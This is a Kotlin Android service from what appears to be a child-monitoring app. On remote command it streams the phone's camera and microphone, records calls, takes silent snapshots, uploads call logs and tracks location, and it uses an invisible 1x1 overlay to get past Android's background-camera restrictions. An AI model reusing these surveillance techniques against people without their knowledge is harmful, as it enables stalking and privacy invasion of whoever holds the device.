package com.example.authapp.service

import android.Manifest
import android.app.*
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.content.pm.ServiceInfo
import android.location.Location
import android.location.LocationListener
import android.location.LocationManager
import android.media.AudioManager
import android.net.Uri
import android.net.wifi.WifiManager
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import androidx.core.app.ServiceCompat
import androidx.core.content.ContextCompat
import com.example.authapp.analytics.AppHealthTelemetry
import com.example.authapp.data.AppPreferences
import com.example.authapp.data.FirebaseRepository
import com.example.authapp.data.UserLocation
import com.example.authapp.recorder.CallRecorder
import com.example.authapp.recorder.StreamAudioRecorder
import com.example.authapp.webrtc.WebRtcManager
import com.google.firebase.crashlytics.FirebaseCrashlytics
import com.google.firebase.database.ChildEventListener
import com.google.firebase.database.ValueEventListener

class ChildForegroundService : Service() {
    private var wakeLock: PowerManager.WakeLock? = null
    private var wifiLock: WifiManager.WifiLock? = null
    private var locationManager: LocationManager? = null
    private var locationListener: LocationListener? = null
    private var locationRequestListener: ValueEventListener? = null
    private var webRtcManager: WebRtcManager? = null
    private var streamRequestListener: ValueEventListener? = null
    private var streamRecordingListener: ValueEventListener? = null
    private var streamAudioRecorder: StreamAudioRecorder? = null
    private var callRecorder: CallRecorder? = null
    private var sdpAnswerListener: ValueEventListener? = null
    private var parentCandidateListener: ChildEventListener? = null
    private var cameraFacingListener: ValueEventListener? = null
    private var currentSessionId: String? = null
    private var isStreaming = false
    private val mainHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private val candidateBuffer = mutableListOf<Map<String, Any>>()
    private val candidateHandler = android.os.Handler(android.os.Looper.getMainLooper())
    private var overlayView: android.view.View? = null
    private var heartbeatHandler: android.os.Handler? = null
    private var heartbeatRunnable: Runnable? = null
    private var currentServiceState: String = "IDLE_PROTECTED"

    companion object {
        const val CHANNEL_ID = "ChildStreamChannel"
        const val NOTIFICATION_ID = 1001
        const val ACTION_START_MONITORING = "ACTION_START_MONITORING"
        const val ACTION_START = "ACTION_START_STREAM"
        const val ACTION_STOP = "ACTION_STOP_STREAM"
        const val ACTION_START_CALL_RECORDING = "ACTION_START_CALL_RECORDING"
        const val ACTION_STOP_CALL_RECORDING = "ACTION_STOP_CALL_RECORDING"
        const val EXTRA_STREAM_TYPE = "EXTRA_STREAM_TYPE"
        const val EXTRA_SESSION_ID = "EXTRA_SESSION_ID"
        const val EXTRA_PHONE_NUMBER = "EXTRA_PHONE_NUMBER"
    }

    override fun onCreate() {
        super.onCreate()
        createNotificationChannel()
        acquireWakeLock()
        startMonitoringStreamRequests()
        startLocationMonitoring()
        startHeartbeatTimer()
    }

    private fun startHeartbeatTimer() {
        heartbeatHandler = android.os.Handler(android.os.Looper.getMainLooper())
        heartbeatRunnable = object : Runnable {
            override fun run() {
                AppHealthTelemetry.sendHeartbeat(applicationContext, currentServiceState)
                heartbeatHandler?.postDelayed(this, 60_000L) // every 60 seconds
            }
        }
        heartbeatHandler?.post(heartbeatRunnable!!)
    }

    private fun hasLocationPermission(): Boolean {
        val fine = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
        val coarse = ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) == PackageManager.PERMISSION_GRANTED
        return fine || coarse
    }

    private fun hasMicrophonePermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) == PackageManager.PERMISSION_GRANTED
    }

    private fun hasCameraPermission(): Boolean {
        return ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) == PackageManager.PERMISSION_GRANTED
    }

    private fun ensureOverlayWindow() {
        if (overlayView != null) return
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !android.provider.Settings.canDrawOverlays(this)) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LIVE_VIDEO",
                "WARNING",
                "SYSTEM_ALERT_WINDOW permission not granted. Background camera might be blocked by OS."
            )
            return
        }
        val attachRunnable = Runnable {
            if (overlayView != null) return@Runnable
            try {
                val windowManager = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager ?: return@Runnable
                val layoutType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                    android.view.WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY
                } else {
                    @Suppress("DEPRECATION")
                    android.view.WindowManager.LayoutParams.TYPE_PHONE
                }
                val params = android.view.WindowManager.LayoutParams(
                    1, 1,
                    layoutType,
                    android.view.WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE or
                    android.view.WindowManager.LayoutParams.FLAG_NOT_TOUCHABLE or
                    android.view.WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS,
                    android.graphics.PixelFormat.TRANSLUCENT
                ).apply {
                    gravity = android.view.Gravity.TOP or android.view.Gravity.START
                    x = 0
                    y = 0
                }
                val view = android.view.View(this)
                windowManager.addView(view, params)
                overlayView = view
                FirebaseCrashlytics.getInstance().log("[ChildService] 1x1 Overlay window attached for background camera access")
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] ensureOverlayWindow error: ${e.localizedMessage}")
            }
        }
        if (android.os.Looper.myLooper() == android.os.Looper.getMainLooper()) {
            attachRunnable.run()
        } else {
            mainHandler.post(attachRunnable)
        }
    }

    private fun removeOverlayWindow() {
        mainHandler.post {
            overlayView?.let { view ->
                try {
                    val windowManager = getSystemService(Context.WINDOW_SERVICE) as? android.view.WindowManager
                    windowManager?.removeView(view)
                } catch (_: Exception) {}
            }
            overlayView = null
        }
    }

    private fun getIdleServiceType(): Int {
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        }
        return type
    }

    private fun getStreamingServiceType(streamType: String): Int {
        var type = 0
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
            if (hasMicrophonePermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_MICROPHONE
            }
            if (hasCameraPermission() && streamType.equals("video", ignoreCase = true)) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
            }
        } else if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
            if (hasLocationPermission()) {
                type = type or ServiceInfo.FOREGROUND_SERVICE_TYPE_LOCATION
            }
        }
        return type
    }

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        when (intent?.action) {
            ACTION_START -> {
                val streamType = intent.getStringExtra(EXTRA_STREAM_TYPE) ?: "audio"
                val sessionId = intent.getStringExtra(EXTRA_SESSION_ID) ?: ""
                if (streamType.equals("video", ignoreCase = true)) {
                    ensureOverlayWindow()
                }
                val serviceType = getStreamingServiceType(streamType)
                currentServiceState = if (streamType.equals("video", ignoreCase = true)) "STREAMING_VIDEO" else "STREAMING_AUDIO"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "LIVE_STREAM",
                    "STARTED",
                    "Stream command received ($streamType), session: $sessionId"
                )
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Active Remote Stream ($streamType)"),
                        serviceType
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground error: ${e.localizedMessage}")
                }
                startWebRtcStream(sessionId, streamType)
            }
            ACTION_START_MONITORING -> {
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Background Protection Active"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground idle error: ${e.localizedMessage}")
                }
                startMonitoringStreamRequests()
            }
            ACTION_START_CALL_RECORDING -> {
                val phoneNumber = intent.getStringExtra(EXTRA_PHONE_NUMBER) ?: "unknown"
                currentServiceState = "RECORDING_CALL"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                AppHealthTelemetry.logDiagnostic(
                    applicationContext,
                    "CALL_RECORDING",
                    "STARTED",
                    "Call recording initiated via foreground service for number: $phoneNumber"
                )
                if (callRecorder == null) {
                    callRecorder = CallRecorder(applicationContext)
                }
                callRecorder?.startCallRecording(phoneNumber)
            }
            ACTION_STOP_CALL_RECORDING -> {
                val durationSec = callRecorder?.recordingStartTimeMillis?.let {
                    if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                } ?: 0L
                val recordedFile = callRecorder?.stopCallRecording()
                callRecorder = null
                currentServiceState = "IDLE_PROTECTED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)

                val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                if (uid.isNotEmpty() && recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                    AppHealthTelemetry.logDiagnostic(
                        applicationContext,
                        "CALL_RECORDING",
                        "SUCCESS",
                        "Call audio captured locally (${durationSec}s, ${recordedFile.length()} bytes). Starting Cloud sync."
                    )
                    FirebaseRepository.saveRecordingSession(
                        childId = uid,
                        streamType = "call",
                        durationSeconds = durationSec,
                        localFilePath = recordedFile.absolutePath
                    ) {
                        try {
                            val fileUri = Uri.fromFile(recordedFile)
                            FirebaseRepository.uploadRecordingFile(
                                childId = uid,
                                fileUri = fileUri,
                                streamType = "call",
                                durationSeconds = durationSec,
                                localFilePath = recordedFile.absolutePath,
                                onSuccess = {
                                    AppHealthTelemetry.logDiagnostic(
                                        applicationContext,
                                        "CALL_RECORDING",
                                        "SUCCESS",
                                        "Call recording uploaded to Firebase Storage and synced to Parent History."
                                    )
                                },
                                onFailure = { err ->
                                    AppHealthTelemetry.logDiagnostic(
                                        applicationContext,
                                        "CALL_RECORDING",
                                        "FAILED",
                                        "Cloud upload failed: $err",
                                        err
                                    )
                                }
                            )
                        } catch (e: Exception) {
                            AppHealthTelemetry.logDiagnostic(
                                applicationContext,
                                "CALL_RECORDING",
                                "FAILED",
                                "Call upload error: ${e.localizedMessage}",
                                e.localizedMessage
                            )
                        }
                    }
                } else {
                    AppHealthTelemetry.logDiagnostic(
                        applicationContext,
                        "CALL_RECORDING",
                        "FAILED",
                        "Call recording output was empty or failed to generate file"
                    )
                }
            }
            ACTION_STOP -> {
                currentServiceState = "STOPPED"
                AppHealthTelemetry.syncDeviceHealth(applicationContext, currentServiceState)
                stopStream()
                callRecorder?.stopCallRecording()
                callRecorder = null
                streamAudioRecorder?.stopRecording()
                streamAudioRecorder = null
                stopForeground(STOP_FOREGROUND_REMOVE)
                stopSelf()
            }
            else -> {
                val effectiveUid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                val isUserLoggedIn = FirebaseRepository.currentUser != null || effectiveUid.isNotEmpty()
                if (!isUserLoggedIn) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] No user logged in. Terminating service.")
                    stopStream()
                    stopForeground(STOP_FOREGROUND_REMOVE)
                    stopSelf()
                    return START_NOT_STICKY
                }

                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Background Protection Active"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground default error: ${e.localizedMessage}")
                }
                startMonitoringStreamRequests()
            }
        }
        return START_STICKY
    }

    private fun startMonitoringStreamRequests() {
        val uid = FirebaseRepository.currentUser?.uid?.takeIf { it.isNotEmpty() }
            ?: AppPreferences.getUserId(applicationContext).takeIf { it.isNotEmpty() }

        if (uid.isNullOrEmpty()) {
            FirebaseCrashlytics.getInstance().log("[ChildService] User signed out or not found. Stopping background service.")
            stopStream()
            stopForeground(STOP_FOREGROUND_REMOVE)
            stopSelf()
            return
        }
        FirebaseRepository.setupPresenceSystem(uid)

        // Remote Recording Listener (Parent clicks 'Record' on remote stream)
        if (streamRecordingListener == null) {
            streamRecordingListener = FirebaseRepository.listenToRemoteRecording(uid) { isRecording, recType ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Remote recording command: isRecording=$isRecording, type=$recType")
                if (isRecording) {
                    if (streamAudioRecorder == null) {
                        streamAudioRecorder = StreamAudioRecorder(applicationContext)
                    }
                    streamAudioRecorder?.startRecording(recType)
                } else {
                    val durationSec = streamAudioRecorder?.recordingStartTimeMillis?.let {
                        if (it > 0L) (System.currentTimeMillis() - it) / 1000L else 0L
                    } ?: 0L
                    val recordedFile = streamAudioRecorder?.stopRecording()
                    streamAudioRecorder = null
                    if (recordedFile != null && recordedFile.exists() && recordedFile.length() > 0) {
                        FirebaseRepository.saveRecordingSession(
                            childId = uid,
                            streamType = recType,
                            durationSeconds = durationSec,
                            localFilePath = recordedFile.absolutePath
                        ) {
                            try {
                                val fileUri = Uri.fromFile(recordedFile)
                                FirebaseRepository.uploadRecordingFile(
                                    childId = uid,
                                    fileUri = fileUri,
                                    streamType = recType,
                                    durationSeconds = durationSec,
                                    localFilePath = recordedFile.absolutePath
                                )
                                FirebaseCrashlytics.getInstance().log("[ChildService] Uploaded remote stream recording successfully")
                            } catch (e: Exception) {
                                FirebaseCrashlytics.getInstance().recordException(e)
                            }
                        }
                    }
                }
            }
        }

        // SIM Change Detection (Phase 2)
        com.example.authapp.security.SimChangeDetector.checkSimChange(applicationContext, uid)

        // Sync Call Logs (Phase 2)
        try {
            val callLogs = com.example.authapp.utils.CallLogUtils.getRecentCallLogs(applicationContext, limit = 30)
            if (callLogs.isNotEmpty()) {
                FirebaseRepository.syncCallLogs(uid, callLogs)
            }
        } catch (_: Exception) {}

        // Listen for Remote Snapshot requests (Phase 1)
        FirebaseRepository.listenToSnapshotRequest(uid) { cameraFacing ->
            val isFront = cameraFacing.equals("front", ignoreCase = true)
            com.example.authapp.camera.SilentSnapshotManager(applicationContext).captureSnapshot(
                isFront = isFront,
                onCaptured = { file ->
                    FirebaseRepository.uploadSnapshot(
                        childId = uid,
                        fileUri = Uri.fromFile(file),
                        cameraFacing = cameraFacing,
                        onSuccess = {
                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot uploaded successfully: ${it.id}")
                            try { file.delete() } catch (_: Exception) {}
                        },
                        onFailure = { err ->
                            FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot upload error: $err")
                        }
                    )
                },
                onError = { err ->
                    FirebaseCrashlytics.getInstance().log("[ChildService] Snapshot capture error: $err")
                }
            )
        }

        // Listen for Recording Schedules (Phase 1)
        FirebaseRepository.listenToRecordingSchedules(uid) { schedules ->
            for (schedule in schedules) {
                com.example.authapp.scheduler.RecordingScheduler.setSchedule(applicationContext, schedule)
            }
        }

        if (streamRequestListener != null) return

        FirebaseCrashlytics.getInstance().log("[ChildService] Listening to RTDB stream requests for: $uid")
        streamRequestListener = FirebaseRepository.listenToStreamRequests(
            childId = uid,
            onRequested = { streamType, sessionId ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Stream request received over RTDB: $streamType, session: $sessionId")
                if (!isStreaming || currentSessionId != sessionId) {
                    if (streamType.equals("video", ignoreCase = true)) {
                        ensureOverlayWindow()
                    }
                    val serviceType = getStreamingServiceType(streamType)
                    try {
                        ServiceCompat.startForeground(
                            this,
                            NOTIFICATION_ID,
                            buildNotification("Active Remote Stream ($streamType)"),
                            serviceType
                        )
                    } catch (e: Exception) {
                        FirebaseCrashlytics.getInstance().log("[ChildService] startForeground stream error: ${e.localizedMessage}")
                    }
                    startWebRtcStream(sessionId, streamType)
                }
            },
            onStopped = {
                FirebaseCrashlytics.getInstance().log("[ChildService] Remote stream stopped by Parent")
                stopStream()
                try {
                    ServiceCompat.startForeground(
                        this,
                        NOTIFICATION_ID,
                        buildNotification("Background Protection Active"),
                        getIdleServiceType()
                    )
                } catch (e: Exception) {
                    FirebaseCrashlytics.getInstance().log("[ChildService] startForeground restore error: ${e.localizedMessage}")
                }
            }
        )
    }

    private fun startWebRtcStream(sessionId: String, streamType: String) {
        if (isStreaming && currentSessionId == sessionId) return
        stopStream()

        currentSessionId = sessionId
        isStreaming = true
        acquireWakeLock()

        if (streamType.equals("video", ignoreCase = true)) {
            ensureOverlayWindow()
        }

        try {
            // Configure hardware microphone routing for WebRTC
            try {
                val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
                // Broadcaster MUST stay in MODE_NORMAL so local media playback (YouTube, music)
                // and loudspeaker are NEVER suppressed or redirected to earpiece
                audioManager?.mode = AudioManager.MODE_NORMAL
                audioManager?.isMicrophoneMute = false
            } catch (e: Exception) {
                FirebaseCrashlytics.getInstance().log("[ChildService] AudioManager mode error: ${e.localizedMessage}")
            }

            webRtcManager = WebRtcManager(applicationContext)
            FirebaseRepository.fetchIceServers { iceServers ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Starting WebRTC stream ($streamType) with ${iceServers.size} ICE servers for session: $sessionId")

                webRtcManager?.startStream(
                    streamType = streamType,
                    iceServers = iceServers,
                    onIceCandidate = { candidate ->
                        val candMap = mapOf(
                            "sdpMid" to candidate.sdpMid,
                            "sdpMLineIndex" to candidate.sdpMLineIndex,
                            "sdp" to candidate.sdp
                        )
                        synchronized(candidateBuffer) {
                            candidateBuffer.add(candMap)
                        }
                        candidateHandler.removeCallbacksAndMessages(null)
                        candidateHandler.postDelayed({
                            val batch = synchronized(candidateBuffer) {
                                val list = candidateBuffer.toList()
                                candidateBuffer.clear()
                                list
                            }
                            if (batch.isNotEmpty()) {
                                FirebaseRepository.sendIceCandidatesBatch(sessionId, batch, isParent = false)
                            }
                        }, 500L)
                    },
                    onSdpCreated = { sdp ->
                        FirebaseCrashlytics.getInstance().log("[ChildService] Sending SDP Offer to RTDB")
                        FirebaseRepository.sendSdpOffer(sessionId, sdp.description)
                    }
            )

            // 1. Listen for SDP Answer from Parent
            sdpAnswerListener = FirebaseRepository.listenToSdpAnswer(sessionId) { sdpAnswer ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Received SDP Answer from Parent")
                webRtcManager?.setRemoteAnswer(sdpAnswer)
            }

            // 2. Listen for Parent ICE candidates
            parentCandidateListener = FirebaseRepository.listenToCandidates(sessionId, listenToParentCandidates = true) { sdpMid, sdpMLineIndex, sdp ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Received Parent ICE Candidate")
                webRtcManager?.addRemoteCandidate(sdpMid, sdpMLineIndex, sdp)
            }

            // 3. Listen for Camera Flip requests
            cameraFacingListener = FirebaseRepository.listenToCameraFacing(sessionId) { isFront ->
                FirebaseCrashlytics.getInstance().log("[ChildService] Camera flip toggled: isFront=$isFront")
                webRtcManager?.switchCamera()
            }
            } // end fetchIceServers
        } catch (t: Throwable) {
            FirebaseCrashlytics.getInstance().recordException(t)
            AppHealthTelemetry.logDiagnostic(applicationContext, "WEBRTC_STREAM", "FAILED", "Failed to start WebRTC stream on child: ${t.localizedMessage}", t.message)
            stopStream()
        }
    }

    private fun stopStream() {
        val oldSessionId = currentSessionId
        isStreaming = false
        currentSessionId = null

        if (!oldSessionId.isNullOrEmpty()) {
            sdpAnswerListener?.let {
                FirebaseRepository.removeSdpAnswerListener(oldSessionId, it)
            }
            parentCandidateListener?.let {
                FirebaseRepository.removeCandidateListener(oldSessionId, listenToParentCandidates = true, it)
            }
            cameraFacingListener?.let {
                FirebaseRepository.removeCameraFacingListener(oldSessionId, it)
            }
        }
        candidateHandler.removeCallbacksAndMessages(null)
        val remaining = synchronized(candidateBuffer) {
            val list = candidateBuffer.toList()
            candidateBuffer.clear()
            list
        }
        if (remaining.isNotEmpty() && !oldSessionId.isNullOrEmpty()) {
            FirebaseRepository.sendIceCandidatesBatch(oldSessionId, remaining, isParent = false)
        }

        sdpAnswerListener = null
        parentCandidateListener = null
        cameraFacingListener = null

        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.mode = AudioManager.MODE_NORMAL
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().log("[ChildService] audioManager reset error: ${e.localizedMessage}")
        }
        try {
            webRtcManager?.stopStream()
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
        webRtcManager = null
        releaseWakeLock()
        removeOverlayWindow()
    }

    private fun acquireWakeLock() {
        try {
            if (wakeLock == null) {
                val powerManager = getSystemService(Context.POWER_SERVICE) as? PowerManager
                wakeLock = powerManager?.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "AuthApp:ChildStreamWakeLock")
                wakeLock?.setReferenceCounted(false)
            }
            // 30 minute safe timeout to prevent draining battery if stream disconnect is not received
            wakeLock?.acquire(30 * 60 * 1000L)
            FirebaseCrashlytics.getInstance().log("[ChildService] Stream Partial WakeLock acquired (30m max)")
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }

        try {
            if (wifiLock == null) {
                val wifiManager = applicationContext.getSystemService(Context.WIFI_SERVICE) as? WifiManager
                wifiLock = wifiManager?.createWifiLock(WifiManager.WIFI_MODE_FULL_HIGH_PERF, "AuthApp:ChildWifiLock")
                wifiLock?.setReferenceCounted(false)
            }
            wifiLock?.acquire()
            FirebaseCrashlytics.getInstance().log("[ChildService] Stream High-perf WifiLock acquired")
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
                FirebaseCrashlytics.getInstance().log("[ChildService] Stream Partial WakeLock released")
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
        wakeLock = null

        try {
            if (wifiLock?.isHeld == true) {
                wifiLock?.release()
                FirebaseCrashlytics.getInstance().log("[ChildService] Stream WifiLock released")
            }
        } catch (e: Exception) {
            FirebaseCrashlytics.getInstance().recordException(e)
        }
        wifiLock = null
    }

    private fun startLocationMonitoring() {
        if (!hasLocationPermission()) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "Location permissions (FINE or COARSE) not granted on child device."
            )
            return
        }
        try {
            locationManager = getSystemService(Context.LOCATION_SERVICE) as? LocationManager
            locationListener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    if (uid.isEmpty()) return
                    val userLoc = UserLocation(
                        latitude = loc.latitude,
                        longitude = loc.longitude,
                        accuracy = loc.accuracy,
                        timestamp = loc.time,
                        provider = loc.provider ?: "gps"
                    )
                    FirebaseRepository.updateChildLocation(uid, userLoc)
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            }

            // Push last known location if available
            val lastGps = locationManager?.getLastKnownLocation(LocationManager.GPS_PROVIDER)
            val lastNet = locationManager?.getLastKnownLocation(LocationManager.NETWORK_PROVIDER)
            val bestLast = when {
                lastGps != null && lastNet != null -> if (lastGps.time > lastNet.time) lastGps else lastNet
                lastGps != null -> lastGps
                else -> lastNet
            }
            val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
            if (bestLast != null && uid.isNotEmpty()) {
                FirebaseRepository.updateChildLocation(
                    uid,
                    UserLocation(
                        latitude = bestLast.latitude,
                        longitude = bestLast.longitude,
                        accuracy = bestLast.accuracy,
                        timestamp = bestLast.time,
                        provider = bestLast.provider ?: "last_known"
                    )
                )
            }

            // Periodic updates (every 30s or 15 meters to minimize battery drain and RTDB cost)
            locationManager?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 30000L, 15f, locationListener!!)
            locationManager?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 30000L, 15f, locationListener!!)

            // Listen for on-demand "Refresh GPS" from Parent
            if (uid.isNotEmpty()) {
                locationRequestListener = FirebaseRepository.listenToLocationRequests(uid) {
                    fetchSingleLocationFix()
                }
            }
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "SUCCESS",
                "Location listener registered (GPS + Network)"
            )
        } catch (e: SecurityException) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "Location security exception: ${e.localizedMessage}",
                e.localizedMessage
            )
        } catch (e: Exception) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "FAILED",
                "Location init error: ${e.localizedMessage}",
                e.localizedMessage
            )
        }
    }

    private fun fetchSingleLocationFix() {
        if (!hasLocationPermission()) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "PERMISSION_DENIED",
                "On-demand location refresh skipped: permission denied"
            )
            return
        }
        try {
            val lm = locationManager ?: (getSystemService(Context.LOCATION_SERVICE) as? LocationManager)
            val singleListener = object : LocationListener {
                override fun onLocationChanged(loc: Location) {
                    val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
                    if (uid.isNotEmpty()) {
                        FirebaseRepository.updateChildLocation(
                            uid,
                            UserLocation(
                                latitude = loc.latitude,
                                longitude = loc.longitude,
                                accuracy = loc.accuracy,
                                timestamp = loc.time,
                                provider = loc.provider ?: "gps_refresh"
                            )
                        )
                        AppHealthTelemetry.logDiagnostic(
                            applicationContext,
                            "LOCATION_TRACKING",
                            "SUCCESS",
                            "On-demand single GPS fix acquired (accuracy: ${loc.accuracy}m)"
                        )
                    }
                    try {
                        lm?.removeUpdates(this)
                    } catch (_: Exception) {}
                }
                override fun onProviderEnabled(provider: String) {}
                override fun onProviderDisabled(provider: String) {}
                @Deprecated("Deprecated in Java")
                override fun onStatusChanged(provider: String?, status: Int, extras: android.os.Bundle?) {}
            }
            lm?.requestLocationUpdates(LocationManager.GPS_PROVIDER, 0L, 0f, singleListener)
            lm?.requestLocationUpdates(LocationManager.NETWORK_PROVIDER, 0L, 0f, singleListener)
        } catch (e: Exception) {
            AppHealthTelemetry.logDiagnostic(
                applicationContext,
                "LOCATION_TRACKING",
                "FAILED",
                "fetchSingleLocationFix error: ${e.localizedMessage}",
                e.localizedMessage
            )
        }
    }

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Child Monitoring Stream",
                NotificationManager.IMPORTANCE_HIGH
            ).apply {
                description = "Active security monitoring and stream service"
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(contentText: String): Notification {
        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Apna Satthi Protection")
            .setContentText(contentText)
            .setSmallIcon(android.R.drawable.ic_menu_camera)
            .setPriority(NotificationCompat.PRIORITY_HIGH)
            .setCategory(NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .build()
    }

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onDestroy() {
        heartbeatHandler?.removeCallbacksAndMessages(null)
        heartbeatHandler = null
        heartbeatRunnable = null
        AppHealthTelemetry.syncDeviceHealth(applicationContext, "STOPPED")
        stopStream()
        try {
            callRecorder?.stopCallRecording()
            callRecorder = null
        } catch (_: Exception) {}
        try {
            streamAudioRecorder?.stopRecording()
            streamAudioRecorder = null
        } catch (_: Exception) {}
        try {
            val audioManager = getSystemService(Context.AUDIO_SERVICE) as? AudioManager
            audioManager?.mode = AudioManager.MODE_NORMAL
            audioManager?.isMicrophoneMute = false
        } catch (_: Exception) {}
        val uid = AppHealthTelemetry.getEffectiveUserId(applicationContext)
        if (uid.isNotEmpty() && streamRequestListener != null) {
            FirebaseRepository.removeStreamRequestListener(uid, streamRequestListener!!)
            streamRequestListener = null
        }
        if (uid.isNotEmpty() && streamRecordingListener != null) {
            FirebaseRepository.removeValueListener("streams/$uid/recordCommand", streamRecordingListener!!)
            streamRecordingListener = null
        }
        if (locationListener != null && locationManager != null) {
            try {
                locationManager?.removeUpdates(locationListener!!)
            } catch (_: Exception) {}
            locationListener = null
        }
        if (locationRequestListener != null) {
            if (uid.isNotEmpty()) {
                FirebaseRepository.removeValueListener("users/$uid/locationRequest", locationRequestListener!!)
            }
            locationRequestListener = null
        }
        releaseWakeLock()
        removeOverlayWindow()
        super.onDestroy()
    }
}
